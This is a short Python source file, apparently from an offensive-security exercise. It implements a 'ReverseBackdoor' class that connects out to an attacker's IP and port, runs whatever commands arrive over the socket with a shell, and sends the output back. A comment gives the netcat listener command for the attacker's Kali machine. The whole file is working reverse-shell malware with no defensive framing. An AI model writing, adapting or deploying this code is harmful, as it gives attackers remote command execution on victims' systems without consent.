#!usr/bin/env python3
import socket
import subprocess
import sys


# 1. Create a open port on kali (attackers) machine using netcat
# $ nc -vv -l -p 4444
# nc = netcat, -vv=very verbose, -l=listen, -p=port

class ReverseBackdoor:
	def __init__(self, ip:str, port:int)->None:
		self.port = port 
		self.ip = ip

		# creating a socket : socket.socket(family=AF_INET, type=SOCK_STREAM, proto=0, fileno=None)
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.connection.connect((self.ip,self.port))


	def execute_command(self,command:str):
		'''
		executes command and return command's output.
		'''
		return subprocess.check_output(command, shell=True)


	def run(self):
		while True:
			try:
				command = self.connection.recv(1024).decode('utf-8')
				command_output = self.execute_command(command)
				self.connection.send(command_output)

			except ConnectionResetError:
				print('[-] Lost Connection.')
				self.connection.close()
				sys.exit()

			except Exception as e:
				exception = ('[-] Exception : ' + str(e)).encode('utf-8')
				self.connection.send(exception)
